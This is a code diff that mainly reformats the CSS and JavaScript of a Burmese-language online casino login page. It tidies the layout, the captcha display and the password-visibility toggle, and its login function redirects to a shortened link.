@@ -1,10 +1,8 @@
 <!DOCTYPE html>
 <html lang="my">
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>ShweCasino Login</title>
 
 <style>
@@ -14,7 +12,6 @@ margin:0;
 font-family:"Myanmar Text";
 background:#8b0000;
 color:white;
-min-height:100vh;
 }
 
 /* banner */
@@ -30,16 +27,18 @@ display:block;
 
 .login-box{
 background:#6b0000;
-margin:15px auto;
+margin:15px;
 padding:20px;
 border-radius:15px;
 max-width:500px;
-width:90%;
+margin-left:auto;
+margin-right:auto;
 }
 
 h2{
 margin-top:0;
 color:#ffcc66;
+text-align:center;
 }
 
 /* input */
@@ -182,31 +181,17 @@ function login(){
 window.location.href="https://cutt.ly/otrecCFE";
 }
 
-/* captcha */
-
 function cap(){
-
-let n = Math.floor(10000 + Math.random() * 90000);
-
+let n=Math.floor(10000+Math.random()*90000);
 document.getElementById("cap").innerText =
 n.toString().split("").join(" ");
-
 }
 
 cap();
 
-/* password eye */
-
 function toggle(){
-
-let p = document.getElementById("pass");
-
-if(p.type === "password"){
-p.type = "text";
-}else{
-p.type = "password";
-}
-
+let p=document.getElementById("pass");
+p.type = (p.type==="password") ? "text" : "password";
 }
 
 </script>
